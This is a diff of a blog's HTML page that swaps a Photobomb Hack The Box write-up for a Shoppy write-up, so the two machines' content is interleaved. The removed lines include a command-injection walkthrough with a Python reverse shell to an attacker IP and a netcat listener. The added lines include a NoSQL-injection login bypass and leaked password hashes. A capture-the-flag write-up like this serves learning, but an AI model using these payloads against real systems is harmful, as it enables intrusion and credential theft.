@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="en-us" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='This is a writeup of the Photobomb machine in Hack The Box platform.'><title>Photobomb HTB Writeup</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='This is a writeup of the Shoppy machine in Hack The Box platform.'><title>Shoppy HTB Writeup</title>
 
-<link rel='canonical' href='https://AbdallahAdham.com/p/photobomb-htb-writeup/'>
+<link rel='canonical' href='https://AbdallahAdham.com/p/shoppy-htb-writeup/'>
 
-<link rel="stylesheet" href="/scss/style.min.5a8e892f6fa14515e9065eee1f5d2e05302606ec7f11750b2fb95198f9cdcbfd.css"><meta property='og:title' content='Photobomb HTB Writeup'>
-<meta property='og:description' content='This is a writeup of the Photobomb machine in Hack The Box platform.'>
-<meta property='og:url' content='https://AbdallahAdham.com/p/photobomb-htb-writeup/'>
+<link rel="stylesheet" href="/scss/style.min.5a8e892f6fa14515e9065eee1f5d2e05302606ec7f11750b2fb95198f9cdcbfd.css"><meta property='og:title' content='Shoppy HTB Writeup'>
+<meta property='og:description' content='This is a writeup of the Shoppy machine in Hack The Box platform.'>
+<meta property='og:url' content='https://AbdallahAdham.com/p/shoppy-htb-writeup/'>
 <meta property='og:site_name' content='Abdallah Adham'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='HackTheBox' /><meta property='article:tag' content='PenTesting' /><meta property='article:tag' content='Web' /><meta property='article:tag' content='Exploit' /><meta property='article:tag' content='Vulnerability' /><meta property='article:published_time' content='2022-11-10T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-11-10T00:00:00&#43;00:00'/><meta property='og:image' content='https://AbdallahAdham.com/post/Photobomb_HTB/photobomb_htb.jpg' />
-<meta name="twitter:title" content="Photobomb HTB Writeup">
-<meta name="twitter:description" content="This is a writeup of the Photobomb machine in Hack The Box platform."><meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content='https://AbdallahAdham.com/post/Photobomb_HTB/photobomb_htb.jpg' />
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='HackTheBox' /><meta property='article:tag' content='PenTesting' /><meta property='article:tag' content='Web' /><meta property='article:tag' content='Exploit' /><meta property='article:tag' content='Vulnerability' /><meta property='article:published_time' content='2022-11-08T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-11-08T00:00:00&#43;00:00'/><meta property='og:image' content='https://AbdallahAdham.com/post/Shoppy_HTB/shoppy_htb.png' />
+<meta name="twitter:title" content="Shoppy HTB Writeup">
+<meta name="twitter:description" content="This is a writeup of the Shoppy machine in Hack The Box platform."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://AbdallahAdham.com/post/Shoppy_HTB/shoppy_htb.png' />
     </head>
     <body class="
     article-page
@@ -324,9 +324,9 @@
     <article class="has-image main-article">
     <header class="article-header">
         <div class="article-image">
-            <a href="/p/photobomb-htb-writeup/">
+            <a href="/p/shoppy-htb-writeup/">
                 
-                    <img src="/post/Photobomb_HTB/photobomb_htb.jpg" loading="lazy" alt="Featured image of post Photobomb HTB Writeup" />
+                    <img src="/post/Shoppy_HTB/shoppy_htb.png" loading="lazy" alt="Featured image of post Shoppy HTB Writeup" />
                 
             </a>
         </div>
@@ -349,12 +349,12 @@
 
     <div class="article-title-wrapper">
         <h2 class="article-title">
-            <a href="/p/photobomb-htb-writeup/">Photobomb HTB Writeup</a>
+            <a href="/p/shoppy-htb-writeup/">Shoppy HTB Writeup</a>
         </h2>
     
         
         <h3 class="article-subtitle">
-            This is a writeup of the Photobomb machine in Hack The Box platform.
+            This is a writeup of the Shoppy machine in Hack The Box platform.
         </h3>
         
     </div>
@@ -372,7 +372,7 @@
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published">July 11, 101010</time>
+                <time class="article-time--published">July 11, 8088</time>
             </div>
         
 
@@ -403,7 +403,62 @@
     
     <hr>
 <h2 id="scanning">Scanning</h2>
-<h3 id="nmap">Nmap</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">─$ nmap 10.10.11.180 -A -oN nmap.txt 
+</span></span><span class="line"><span class="cl">Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-11-07 08:19 EST
+</span></span><span class="line"><span class="cl">Stats: 0:00:05 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">0</span> up<span class="o">)</span>, <span class="m">1</span> undergoing Ping Scan
+</span></span><span class="line"><span class="cl">Parallel DNS resolution of <span class="m">1</span> host. Timing: About 0.00% <span class="k">done</span>
+</span></span><span class="line"><span class="cl">Stats: 0:00:07 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">0</span> up<span class="o">)</span>, <span class="m">1</span> undergoing Ping Scan
+</span></span><span class="line"><span class="cl">Parallel DNS resolution of <span class="m">1</span> host. Timing: About 0.00% <span class="k">done</span>
+</span></span><span class="line"><span class="cl">Stats: 0:00:50 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">1</span> up<span class="o">)</span>, <span class="m">1</span> undergoing Script Scan
+</span></span><span class="line"><span class="cl">NSE Timing: About 99.29% <span class="k">done</span><span class="p">;</span> ETC: 08:20 <span class="o">(</span>0:00:00 remaining<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.180
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.21s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">998</span> closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> 9e5e8351d99f89ea471a12eb81f922c0 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 5857eeeb0650037c8463d7a3415b1ad5 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 3e9d0a4290443860b3b62ce9bd9a6754 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http    nginx 1.23.1
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.23.1
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to http://shoppy.htb
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 53.82 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="enumeration">Enumeration</h2>
+<h3 id="subdomain-enumeration">Subdomain Enumeration</h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -431,327 +486,77 @@
 </span><span class="lnt">23
 </span><span class="lnt">24
 </span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nmap 10.10.11.182 -A -T4 -p- -oN nmap.txt
-</span></span><span class="line"><span class="cl">Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-11-10 08:38 EST
-</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.182
-</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.20s latency<span class="o">)</span>.
-</span></span><span class="line"><span class="cl">Not shown: <span class="m">65524</span> closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
-</span></span><span class="line"><span class="cl">PORT      STATE    SERVICE VERSION
-</span></span><span class="line"><span class="cl">22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
-</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> e22473bbfbdf5cb520b66876748ab58d <span class="o">(</span>RSA<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 04e3ac6e184e1b7effac4fe39dd21bae <span class="o">(</span>ECDSA<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 20e05d8cba71f08c3a1819f24011d29e <span class="o">(</span>ED25519<span class="o">)</span>
-</span></span><span class="line"><span class="cl">80/tcp    open     http    nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to http://photobomb.htb/
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
-</span></span><span class="line"><span class="cl">17692/tcp filtered unknown
-</span></span><span class="line"><span class="cl">18162/tcp filtered unknown
-</span></span><span class="line"><span class="cl">22855/tcp filtered unknown
-</span></span><span class="line"><span class="cl">24998/tcp filtered unknown
-</span></span><span class="line"><span class="cl">44623/tcp filtered unknown
-</span></span><span class="line"><span class="cl">45323/tcp filtered unknown
-</span></span><span class="line"><span class="cl">45854/tcp filtered unknown
-</span></span><span class="line"><span class="cl">48742/tcp filtered unknown
-</span></span><span class="line"><span class="cl">55815/tcp filtered unknown
-</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">─$ ffuf -w Discovery/DNS/bitquark-subdomains-top100000.txt -H <span class="s2">&#34;Host: FUZZ.shoppy.htb&#34;</span> -u http://shoppy.htb -t <span class="m">10</span> -mc <span class="m">200</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 849.15 seconds
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>After the scan has finished, Ofcourse i will add the machine IP to <em>/etc/hosts</em>.</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo <span class="nb">echo</span> <span class="s2">&#34;10.10.11.182    photobomb.htb&#34;</span> &gt;&gt; /etc/hosts
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="enumeration">Enumeration</h2>
-<h3 id="http-enumeration">HTTP Enumeration</h3>
-<p>Now, We open the browser and see what is in this website.</p>
-<p><img src="/post/Photobomb_HTB/imgs/1.JPG"
-	
-	
-	
-	loading="lazy"
-	
-		alt="http_enum"
-	
-	
-></p>
-<p>There is a <strong>&ldquo;Click here!&rdquo;</strong> button, Let&rsquo;s click on it ans see what happens?</p>
-<p><img src="/post/Photobomb_HTB/imgs/2.JPG"
-	
-	
-	
-	loading="lazy"
-	
-		alt="sign_up1"
-	
-	
-></p>
-<p>It opens a pop-up sign up form and asks for a username and password and if failed it redirects you to a <strong>&ldquo;401 Authorization Required&rdquo;</strong> under a <strong>/printer</strong> directory.</p>
-<p><img src="/post/Photobomb_HTB/imgs/3.JPG"
-	
-	
-	
-	loading="lazy"
-	
-		alt="401_page"
-	
-	
-></p>
-<p>Now, I will do two things which are:</p>
-<ol>
-<li>Subdomain Enumeration</li>
-<li>Directory Bruteforce</li>
-</ol>
-<h3 id="subdomain-enumeration">Subdomain Enumeration</h3>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ffuf -w Discovery/DNS/bitquark-subdomains-top100000.txt -H <span class="s2">&#34;Host: FUZZ.photobomb.htb&#34;</span> -u http://photobomb.htb -t <span class="m">10</span> -mc <span class="m">200</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>I have not found any subdomains that exist.</p>
-<h3 id="directory-bruteforce">Directory Bruteforce</h3>
-<p>I am going to use <strong>Dirbuster</strong>:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">DirBuster 1.0-RC1 - Report
-</span></span><span class="line"><span class="cl">http://photobomb.htb:80
-</span></span><span class="line"><span class="cl">--------------------------------
-</span></span><span class="line"><span class="cl">Directories found during testing:
+</span></span><span class="line"><span class="cl">        /<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span>          /<span class="err">&#39;</span>___<span class="se">\ </span>      
+</span></span><span class="line"><span class="cl">       /<span class="se">\ \_</span>_/ /<span class="se">\ \_</span>_/  __  __  /<span class="se">\ \_</span>_/       
+</span></span><span class="line"><span class="cl">       <span class="se">\ \ </span>,__<span class="se">\\</span> <span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\ </span>     
+</span></span><span class="line"><span class="cl">        <span class="se">\ \ \_</span>/ <span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/      
+</span></span><span class="line"><span class="cl">         <span class="se">\ \_\ </span>  <span class="se">\ \_\ </span> <span class="se">\ \_</span>___/  <span class="se">\ \_\ </span>      
+</span></span><span class="line"><span class="cl">          <span class="se">\/</span>_/    <span class="se">\/</span>_/   <span class="se">\/</span>___/    <span class="se">\/</span>_/       
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Dirs found with a <span class="m">200</span> response:
-</span></span><span class="line"><span class="cl">/
+</span></span><span class="line"><span class="cl">       v1.5.0 Kali Exclusive &lt;<span class="m">3</span>
+</span></span><span class="line"><span class="cl">________________________________________________
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Files found with a <span class="m">200</span> responce:
+</span></span><span class="line"><span class="cl"> :: Method           : GET
+</span></span><span class="line"><span class="cl"> :: URL              : http://shoppy.htb
+</span></span><span class="line"><span class="cl"> :: Wordlist         : FUZZ: Discovery/DNS/bitquark-subdomains-top100000.txt
+</span></span><span class="line"><span class="cl"> :: Header           : Host: FUZZ.shoppy.htb
+</span></span><span class="line"><span class="cl"> :: Follow redirects : <span class="nb">false</span>
+</span></span><span class="line"><span class="cl"> :: Calibration      : <span class="nb">false</span>
+</span></span><span class="line"><span class="cl"> :: Timeout          : <span class="m">10</span>
+</span></span><span class="line"><span class="cl"> :: Threads          : <span class="m">10</span>
+</span></span><span class="line"><span class="cl"> :: Matcher          : Response status: <span class="m">200</span>
+</span></span><span class="line"><span class="cl">________________________________________________
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/photobomb.js
-</span></span><span class="line"><span class="cl">--------------------------------
+</span></span><span class="line"><span class="cl">mattermost              <span class="o">[</span>Status: 200, Size: 3122, Words: 141, Lines: 1, Duration: 123ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">:: Progress: <span class="o">[</span>100000/100000<span class="o">]</span> :: Job <span class="o">[</span>1/1<span class="o">]</span> :: <span class="m">64</span> req/sec :: Duration: <span class="o">[</span>0:22:27<span class="o">]</span> :: Errors: <span class="m">0</span> ::
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>So, We have found a Javascript file called <strong>photobomb.js</strong>, Let&rsquo;s see what is in it.</p>
-<p><img src="/post/Photobomb_HTB/imgs/4.JPG"
-	
-	
-	
-	loading="lazy"
-	
-		alt="photobomb.js"
-	
-	
-></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">init</span><span class="p">()</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="c1">// Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/</span><span class="p">))</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByClassName</span><span class="p">(</span><span class="s1">&#39;creds&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">setAttribute</span><span class="p">(</span><span class="s1">&#39;href&#39;</span><span class="p">,</span><span class="s1">&#39;http://pH0t0:b0Mb!@photobomb.htb/printer&#39;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="nx">init</span><span class="p">;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Now, we have credientals to signup to the <strong>/printer</strong> page.</p>
-<p>Copy and paste the URL given above which is:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">http://pH0t0:b0Mb!@photobomb.htb/printer
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>It opens a page contans a plenty of images and down there is a button to download any image we want.</p>
-<p><img src="/post/Photobomb_HTB/imgs/5.JPG"
-	
-	
-	
-	loading="lazy"
-	
-		alt="images"
-	
-	
-></p>
+</div><h3 id="directory-enumeration">Directory Enumeration</h3>
+<p>$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u <a class="link" href="http://shoppy.htb/FUZZ"  target="_blank" rel="noopener"
+    >http://shoppy.htb/FUZZ</a></p>
+<p>images                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 157ms]
+login                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 124ms]
+admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 85ms]
+assets                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 90ms]
+css                     [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 83ms]
+Login                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 88ms]
+js                      [Status: 301, Size: 171, Words: 7, Lines: 11, Duration: 86ms]
+fonts                   [Status: 301, Size: 177, Words: 7, Lines: 11, Duration: 439ms]
+Admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 96ms]
+exports                 [Status: 301, Size: 181, Words: 7, Lines: 11, Duration: 160ms]
+[Status: 200, Size: 2178, Words: 853, Lines: 57, Duration: 87ms]
+LogIn                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 143ms]
+LOGIN                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 118ms]
+:: Progress: [220560/220560] :: Job [1/1] :: 443 req/sec :: Duration: [0:09:27] :: Errors: 0 ::</p>
 <h2 id="exploitation">Exploitation</h2>
-<p>Let&rsquo;s start burpsuite and intercept the downloading request.</p>
-<p><img src="/post/Photobomb_HTB/imgs/6.JPG"
-	
-	
-	
-	loading="lazy"
-	
-		alt="req1"
-	
-	
-></p>
-<h3 id="command-injection">Command Injection</h3>
-<p>So, I have tried to command inject all the parameters with adding <strong>;ls</strong> at the end of each parameter and see what happens.</p>
-<p>Beginning with <strong>photo</strong> parameter:</p>
-<p><img src="/post/Photobomb_HTB/imgs/7.JPG"
-	
-	
-	
-	loading="lazy"
-	
-		alt="req2"
-	
-	
-></p>
-<p>looks not injectable, Then trying on <strong>dimensions</strong> parameter:</p>
-<p><img src="/post/Photobomb_HTB/imgs/8.JPG"
-	
-	
-	
-	loading="lazy"
-	
-		alt="req3"
-	
-	
-></p>
-<p>Also, Not injectable.</p>
-<p>Lastly, The <strong>filetype</strong> parameter:</p>
-<p><img src="/post/Photobomb_HTB/imgs/9.JPG"
-	
-	
-	
-	loading="lazy"
-	
-		alt="req4"
-	
-	
-></p>
-<p>It shows no response, so, It is <em>injectable</em>.</p>
-<p>Let&rsquo;s prepare the <strong>reverse shell</strong>:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.16.23&#34;,4321));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&#34;sh&#34;)&#39;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>And setup the <strong>listener</strong>:</p>
+<h3 id="nosql-injection">NoSQL Injection</h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nc -nlvp <span class="m">4321</span>       
-</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4321</span> ...
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">username= admin&#39;||&#39;1==1
+</span></span><span class="line"><span class="cl">password= anything
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="/post/Photobomb_HTB/imgs/10.JPG"
-	
-	
-	
-	loading="lazy"
-	
-		alt="req5"
-	
-	
-></p>
-<p>And we got the <strong>reverse shell</strong>. Yay!</p>
-<p><img src="/post/Photobomb_HTB/imgs/11.JPG"
-	
-	
-	
-	loading="lazy"
-	
-		alt="revshell"
-	
-	
-></p>
-<p>Let&rsquo;s respawn a <strong>tty</strong>:</p>
-<div class="highlight"><div class="chroma">
+</div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ /usr/bin/script -qc /bin/bash /dev/null
-</span></span><span class="line"><span class="cl">/usr/bin/script -qc /bin/bash /dev/null
-</span></span><span class="line"><span class="cl">wizard@photobomb:~/photobomb$ id
-</span></span><span class="line"><span class="cl">id
-</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>wizard<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>wizard<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>wizard<span class="o">)</span>
-</span></span><span class="line"><span class="cl">wizard@photobomb:~/photobomb$
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">[{</span><span class="nt">&#34;_id&#34;</span><span class="p">:</span><span class="s2">&#34;62db0e93d6d6a999a66ee67a&#34;</span><span class="p">,</span><span class="nt">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span><span class="nt">&#34;password&#34;</span><span class="p">:</span><span class="s2">&#34;23c6877d9e2b564ef8b32c3a23de27b2&#34;</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl"> <span class="p">{</span><span class="nt">&#34;_id&#34;</span><span class="p">:</span><span class="s2">&#34;62db0e93d6d6a999a66ee67b&#34;</span><span class="p">,</span><span class="nt">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;josh&#34;</span><span class="p">,</span><span class="nt">&#34;password&#34;</span><span class="p">:</span><span class="s2">&#34;6ebcea65320589ca4f2f1ce039975995&#34;</span><span class="p">}]</span>
+</span></span><span class="line"><span class="cl"> 
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>We have the access of the user called <strong>wizard</strong>.</p>
-<p>Now, We navigate to the home directory and get the <strong>user.txt</strong></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wizard@photobomb:~/photobomb$ <span class="nb">cd</span> /home
-</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /home
-</span></span><span class="line"><span class="cl">wizard@photobomb:/home$ ls
-</span></span><span class="line"><span class="cl">ls
-</span></span><span class="line"><span class="cl">wizard
-</span></span><span class="line"><span class="cl">wizard@photobomb:/home$ <span class="nb">cd</span> wizard
-</span></span><span class="line"><span class="cl"><span class="nb">cd</span> wizard
-</span></span><span class="line"><span class="cl">wizard@photobomb:~$ ls
-</span></span><span class="line"><span class="cl">ls
-</span></span><span class="line"><span class="cl">photobomb  user.txt
-</span></span><span class="line"><span class="cl">wizard@photobomb:~$ cat user.txt
-</span></span><span class="line"><span class="cl">cat user.txt
-</span></span><span class="line"><span class="cl">41ca28b0feb7e65XXXXXXXXXXXXXX
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="privilage-escalation">Privilage Escalation</h2>
-<h3 id="sudo--l">Sudo -l</h3>
+</div><h3 id="hash-decryption">Hash Decryption</h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -761,104 +566,18 @@
 </span><span class="lnt">5
 </span><span class="lnt">6
 </span><span class="lnt">7
-</span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wizard@photobomb:~/photobomb$ sudo -l
-</span></span><span class="line"><span class="cl">sudo -l
-</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> wizard on photobomb:
-</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
